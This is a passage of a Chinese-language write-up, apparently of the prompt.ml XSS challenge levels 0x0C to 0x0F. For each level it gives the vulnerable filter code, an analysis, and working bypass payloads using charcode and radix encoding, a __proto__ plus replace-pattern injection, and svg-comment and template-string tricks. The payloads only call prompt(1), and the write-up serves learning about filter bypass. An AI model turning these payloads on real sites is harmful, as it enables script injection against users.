href="#4-payload-12"></a> <code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line">payload2:<span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="number">1</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line">payload3:prompt(<span class="built_in">eval</span>((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p>第一个 payload 是 <code>0x08</code> 题目的一个 payload，在这道题也照样能用。</p><blockquote><p>在 JS 中存在一个函数 <code>parseInt(str, radix)</code> ，默认情况下，<code>radix = 10</code>，即它可以把十进制的数字字符串转换成十进制数。但是通过调整进制数 <code>radix</code> ，它可以把其他进制的字符串转换成十进制数。而当 <code>radix = 36</code> 时。它可以把只包含 <code>0-9a-z</code> （大小写不敏感）的字符串转换成十进制数。于是我们可以把 <code>prompt</code>  字符串转换成十进制数：<code>parseInt(&quot;prompt&quot;, 36)</code> ，得到 <code>1558153217</code>，而要将十进制数字还原成字符串，则可以使用另一个函数 <code>toString(radix)</code> （默认情况下 <code>radix = 10</code> ）。</p></blockquote><p>第二个payload是用<code>toString</code>函数简化后的payload，第三个是一个更简化的，因为没有必要对<code>(1)</code> 绕过。</p></blockquote><h4 id="5-html-source-13"><a class="markdownIt-Anchor" href="#5-html-source-13"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">eval</span>((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>))&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-13"><a class="markdownIt-Anchor" href="#6-xss-类型-13"></a> <code>⑥ xss 类型</code></h4><blockquote><p>编码绕过问题。</p></blockquote><h3 id="font-color-navy0x0d-json-objectfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0d-json-objectfont"></a> <font color="navy">0x0D JSON Object</font></h3><h4 id="1-js-代码-14"><a class="markdownIt-Anchor" href="#1-js-代码-14"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-14"><a class="markdownIt-Anchor" href="#2-题目分析-14"></a> <code>② 题目分析</code></h4><blockquote><p>这道题目的代码较多，在这里需要对代码仔细的分析一下：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码要求我们输入的格式必须是 <code>JSON 格式</code>，然后 <code>input</code> 会与一个固定的 JSON <code>{ 'source' : 'http://placehold.it/350x150' }</code> 执行 <code>extend</code> 操作。处理后的 <code>input</code> JSON 对象存储到 <code>config</code> 变量中。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>检测 <code>input</code> 的 JSON <strong>顶层</strong>是否具有属性 <code>source</code> ，若有则不对 <code>input</code> 做任何修改。否则则在 <code>input</code> 的 JSON <strong>顶层</strong> 添加属性 <code>source</code> ，且取默认值为 <code>http://placehold.it/350x150</code> 。实际上这个函数是没什么用的。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>继而利用 <code>test</code> 函数正则校验 <code>config</code> JSON 对象的<strong>顶层属性</strong> <code>source</code> 的值，若其值含有 <code>0-9</code>、 <code>a-z</code>、 <code>A-Z</code>、 <code>_</code>、 <code>:</code>、 <code>/</code>、 <code>.</code>、 以外的字符，则删除 <code>source</code> 属性。换言之这里是避免我们在<strong>顶层属性</strong> <code>source</code> 编写 payload 。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// purify the source by stripping off "</span></span><br><span class="line"><span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure><blockquote><p>即使 <code>config</code> JSON 对象的<strong>顶层属性</strong> <code>source</code> 得以保留，也会把其中的双引号 <code>&quot;</code> 全部过滤。</p><p>换言之这行代码是避免我们闭合 JSON 属性。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br></pre></td></tr></table></figure><blockquote><p>最后把 <code>source</code> 的值作为 <code>img</code> 标签的 <code>src</code> 属性值输出到前端。</p></blockquote><h4 id="3-相关知识点-14"><a class="markdownIt-Anchor" href="#3-相关知识点-14"></a> <code>③ 相关知识点</code></h4><blockquote><p>相当难的一道综合题型，考察对 Javascript 原理的理解程度，相关知识点如下：</p><ul><li><p>Object getter/setter 访问器（accessor）：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="noopener">Object.prototype._<em>proto</em></a></p></li><li><p>String 正则替换：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">String.prototype.replace()</a></p></li><li><p>标签 <code>&lt;img&gt;</code> 的构造 xss 的常用方法</p></li><li><p>String <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8F%8F%E8%BF%B0" target="_blank" rel="noopener">其他的属性</a></p></li></ul></blockquote><h4 id="4-payload-13"><a class="markdownIt-Anchor" href="#4-payload-13"></a> <code>④ payload</code></h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"source"</span>: <span class="string">"--EXP : Delete Me--"</span>, <span class="attr">"__proto__"</span>: &#123;<span class="attr">"source"</span>: <span class="string">"$` onerror=prompt(1) &gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为代码太过于长，于是我打算先按照格式输入进去，看看 <code>HTML source</code> 的结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://sandbox.prompt.ml/PROMPT.JPG"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>原来 source 的值是 src 属性的值，对 <code>&lt;img&gt;</code> 标签来说，正常情况注入 JS，可以通过两个方式：</p></blockquote><ul><li><code>src = x onerror = prompt(1)</code>：通过加载图片的错误，调用 <code>onerror</code> 事件；</li></ul><blockquote><p>对于这种放法，因为双引号 <code>&quot;</code> 被过滤了，我们无法通过闭合 <code>src</code> 的双引号再增加 <code>onerror</code> 属性。<code>src = &quot;onerror = prompt(1)&quot;</code>，但是根据 JS 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E8%AF%AD%E6%B3%95" target="_blank" rel="noopener"><code>replace('_posts/2020.02.27（96）.md', source)</code></a> 函数的语法，第二个由我们控制的参数 <code>source</code> 是可以插入<strong>特殊变量名</strong>以达到某些效果的（详见 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8F%8F%E8%BF%B0" target="_blank" rel="noopener">这里</a> ）。而我们要使用的特殊变量名，就是 <strong>$`</strong>，这个变量名的效果是<code>插入当前匹配的子串左边的内容</code>。就这题而言，因为 <code>'.replace('_posts/2020.02.27（96）.md', source)</code> 第一个参数 <code>_posts/2020.02.27（96）.md</code> 匹配了原字符串，而所匹配部分的左边内容是 <code>&lt;img src=&quot;</code>，因此若第二个参数 <code>source</code> 含有特殊变量，就会把 <code>&lt;img src=&quot;</code>插入到该特殊变量位置。 注意所插入的到 <code>&lt;img src=&quot;</code>最右侧刚好有一个双引号，那么我们就可以用来闭合 <code>src</code> 属性的双引号了。于是我们可以构造 <code>source</code> 的值为</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">` onerror=prompt(1) &gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>当特殊变量被替换后，实际就等价于 <code>，再将其通过</code>replace<code>替换到原串的</code>_posts/2020.02.27（96）.md` ，就可以得到：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;img src="</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> &gt;</span>"&gt;</span><br></pre></td></tr></table></figure><blockquote><p>即 <code>src</code> 属性值等于 <code>&quot; ，被成功闭合了，同时因为是一个无效值，会触发到</code>onerror` 的 JS 。</p><p>那么接下来的问题就是，怎么保留我们所构造的 <code>source</code> 值到最后。</p><p>根据前面的分析知道， <code>source</code> 值就是源于我们输入的 json 的  <code>source</code> 属性值。</p><p>但是在此之前有这样的一段 <code>test</code> 代码，当 <code>source</code> 值含有 <code>0-9</code>、 <code>a-z</code>、 <code>A-Z</code>、 <code>_</code>、 <code>:</code>、 <code>/</code>、 <code>.</code>、 以外的字符，则删除 json 的 <code>source</code> 属性：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forbit invalid image source</span></span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">        <span class="keyword">delete</span> config.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>很不幸地，我们构造的 <code>source</code> 值是满足删除标准的。换言之，若直接 input 的 JSON 如下，是无法把  <code>source</code>  属性值保留到最后的：</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"source"</span> : <span class="string">"$` onerror=prompt(1)"</span> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>最直接的想法是，能不能在 JSON 构造两个 <code>source</code> 属性骗过正则校验，使得其中一个没用的 <code>source</code>  被删除，而我们构造的 <code>source</code>  则得以保留。不过问题是，JSON 是具备 hash 特性的，若直接<strong>在同级构造两个同名属性</strong> <code>source</code> ，后者是会覆盖前者的。不过也并非一无所获，从控制台里面注意到，所构造的 JSON 对象具有一个隐藏属性 <code>__proto__</code> 。特意去查了一下这个属性的作用（详见 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="noopener">这里</a>），得知在 JS 代码中，每个 JSON 对象都具有一个隐藏属性 <code>__proto__</code> ，而这个属性本质上是一个访问器，其作用是当我们需要访问 JSON 对象中的某个属性值时，可以提供类似于 <code>getter</code> / <code>setter</code> 访问方法的语法糖。</p><blockquote><p>例如若在 JS 代码中定义一个这样的 JSON 变量 <code>var json = {&quot;source&quot;: &quot;exp&quot;}</code> ：</p><ul><li>当需要访问 <code>source</code> 的属性值时，如： <code>var src = json.source</code> ，实际上是 <code>__proto__</code> 的 <code>getter</code> 在起作用</li><li>当需要修改 <code>source</code> 的属性值时，如： <code>json.source = &quot;EXP&quot;</code> ，实际上是 <code>__proto__</code> 的 <code>setter</code> 在起作用</li></ul></blockquote><p>虽然 <code>__proto__</code> 是一个访问器，不过默认情况下，我们是不可以 <code>json.__proto__.source</code> 这样访问属性的。但有趣的是，假如在 JSON 中<strong>显式设置</strong>了 <code>__proto__</code> 属性，例如这样：<code>{&quot;__proto__&quot;: {&quot;source&quot;: &quot;exp&quot;}}</code>那么就会给 JS 解析器造成某些“混乱”，使得诸如 <code>json.__proto__.source</code> 的访问属性方式变成可能。不但如此，此时 JSON 还同时支持 <code>json.source</code> 和 <code>json.__proto__.source</code> 两种访问属性方式，且他们是等价的。利用这个特点，我们就可以在 JSON 的<strong>同级构造两个同名属性</strong>。</p><p>例如在 JS 中定义这样的一个 JSON 变量 <code>var json = {&quot;source&quot;: &quot;EXP&quot;, &quot;__proto__&quot;: {&quot;source&quot;: &quot;M02&quot;}}</code>。</p><blockquote><p>当 <code>&quot;source&quot;: &quot;EXP&quot;</code> 属性存在时：</p><ul><li><code>json.source</code>  会优先得到 <code>EXP</code> 的值</li><li><code>json.__proto__.source</code> 会得到全路径 <code>M02</code> 的值</li></ul></blockquote><blockquote><p>当 <code>&quot;source&quot;: &quot;EXP&quot;</code> 属性不存在时：</p><ul><li><code>json.source</code>  会通过 <code>__proto__</code> 访问器得到 <code>M02</code> 的值</li><li><code>json.__proto__.source</code> 依旧会得到全路径 <code>M02</code> 的值</li></ul></blockquote><p>回到这题，我们可以利用这个 JSON 特性进行欺骗，在 input 构造一个类似这样的 JSON ：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#123;"source": "--delete me--", "__proto__": &#123;"source": "payload"&#125;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>其中第一个 <code>source</code> 只需要满足代码中 <code>test</code> 的正则条件使之被删除即可，这样第二个用于 payload 的 <code>source</code> 则可以保留到最后。最终构造出 payload。</p></blockquote><ul><li><code>src = &quot;URI&quot; onload = prompt(1)</code>：通过成功加载图片，调用 <code>onload</code> 事件；</li></ul><blockquote><p>无</p></blockquote><h4 id="5-html-source-14"><a class="markdownIt-Anchor" href="#5-html-source-14"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;img src="</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> &gt;</span>"&gt;</span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-14"><a class="markdownIt-Anchor" href="#6-xss-类型-14"></a> <code>⑥ xss 类型</code></h4><blockquote><p>这是一到综合性较大的题目，涉及的知识点有如此之多，需要好好再看看。</p></blockquote><h3 id="font-color-navy0x0e-base-64font"><a class="markdownIt-Anchor" href="#font-color-navy0x0e-base-64font"></a> <font color="navy">0x0E BASE 64</font></h3><h4 id="1-js-代码-15"><a class="markdownIt-Anchor" href="#1-js-代码-15"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-15"><a class="markdownIt-Anchor" href="#2-题目分析-15"></a> <code>② 题目分析</code></h4><blockquote><p>在这里我转载一篇文章[<a href="https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2014%20-%20Base64" target="_blank" rel="noopener">https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level 14 - Base64</a>](<a href="https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level" target="_blank" rel="noopener">https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level</a> 14 - Base64)</p></blockquote><h4 id="3-相关知识点-15"><a class="markdownIt-Anchor" href="#3-相关知识点-15"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><a href="https://www.jianshu.com/p/ea49397fcd13" target="_blank" rel="noopener">Data URI Scheme</a>： Data URIs 被浏览器严格限制，导致在 HTML 标签中，能够使用 Data URIs 的标签极其有限。<ul><li><code>&lt;img&gt;</code> 标签的 <code>src</code> 属性</li><li><code>&lt;object&gt;</code> 标签的 <code>data</code> 属性</li><li><code>&lt;iframe&gt;</code> 标签的 <code>src</code> 属性</li><li><code>&lt;a&gt;</code> 标签的 <code>href</code> 属性</li></ul></li><li><a href="https://blog.csdn.net/rj042/article/details/48733257" target="_blank" rel="noopener">Base64 编码原理</a></li><li><a href="http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/" target="_blank" rel="noopener">相对协议地址</a></li><li><a href="https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">Unicode 字符编码</a></li><li><a href="http://www.w3school.com.cn/html5/att_script_async.asp" target="_blank" rel="noopener"><code>&lt;script&gt;</code> 异步执行属性 <code>async</code></a></li></ol></blockquote><h4 id="4-payload-14"><a class="markdownIt-Anchor" href="#4-payload-14"></a> <code>④ payload</code></h4><blockquote><p>参考转载的文章</p></blockquote><h4 id="5-html-source-15"><a class="markdownIt-Anchor" href="#5-html-source-15"></a> <code>⑤ HTML source</code></h4><blockquote><p>参考转载的文章</p></blockquote><h4 id="6-xss-类型-15"><a class="markdownIt-Anchor" href="#6-xss-类型-15"></a> <code>⑥ xss 类型</code></h4><blockquote><p><code>date URI</code> 方案和 <code>base64</code> 的结合应用</p></blockquote><h3 id="font-color-navy0x0f-length2font"><a class="markdownIt-Anchor" href="#font-color-navy0x0f-length2font"></a> <font color="navy">0x0F Length2</font></h3><h4 id="1-js-代码-16"><a class="markdownIt-Anchor" href="#1-js-代码-16"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-16"><a class="markdownIt-Anchor" href="#2-题目分析-16"></a> <code>② 题目分析</code></h4><blockquote><p>这道题和 <code>0x07</code>  题目很像，但是这道题目将 <code>*</code> 进行了过滤，但是长度比那道题目多了一些。</p></blockquote><h4 id="3-相关知识点-16"><a class="markdownIt-Anchor" href="#3-相关知识点-16"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>&lt;svg&gt;</code> ：在默认 HTML 语境下， HTML 注释是没办法在 JS 代码中使用的，但是可以借助 <code>&lt;svg&gt;</code> 标签强制解析 XML 语法的特点：在 <code>&lt;svg&gt;</code> 标签中若包含 JS 代码，即使使用 HTML 注释 <code>&lt;!-- --&gt;</code> 也是可以被成功解析的。例如：</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">    &lt;!-- xxxx --&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        &lt;!-- yyyy --&gt;</span><br><span class="line">        alert(<span class="number">1</span>)</span><br><span class="line">        &lt;!-- zzzz --&gt;</span><br><span class="line">        alert(<span class="number">2</span>)</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>svg&gt;</span><br></pre></td></tr></table></figure><blockquote><ol start="2"><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a> ：在 JS 中，可以使用 倒引号（或反引号）包围字符串，字符串中再以 <code>${expression}</code> 方式入表达式，这样表达式就会被执行，例如：</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="string">`&lt;a="1" b='2'&gt; <span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span> by exp`</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-payload-15"><a class="markdownIt-Anchor" href="#4-payload-15"></a> <code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="string">"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">payload2:"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>第一个是根据 <code>&lt;svg&gt;</code> 注释的知识点构造的，但是需要注意的是 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 <code>&lt;!-- --&gt;</code> 就不会起作用了。</p></blockquote><h4 id="5-html-source-16"><a class="markdownIt-Anchor" href="#5-html-source-16"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 